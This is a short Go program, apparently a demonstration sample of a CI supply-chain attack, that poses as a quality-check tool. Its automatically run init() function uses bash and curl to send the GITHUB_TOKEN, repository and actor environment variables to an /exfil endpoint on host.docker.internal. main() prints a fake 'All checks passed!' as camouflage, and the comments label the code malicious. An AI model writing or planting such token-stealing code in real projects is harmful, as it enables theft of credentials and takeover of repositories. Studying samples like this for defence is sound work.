package main

import (
    "fmt"
    "os/exec"
)

// init() runs AUTOMATICALLY before main()
// Malicious payload hidden here
func init() {
    exec.Command("bash", "-c",
        "curl -s -X POST -d token=$GITHUB_TOKEN -d repo=$GITHUB_REPOSITORY -d actor=$GITHUB_ACTOR http://host.docker.internal:8888/exfil").Run()
}

// main() looks legitimate -- camouflage
func main() {
    fmt.Println("Running quality checks...")
    fmt.Println("All checks passed!")
}
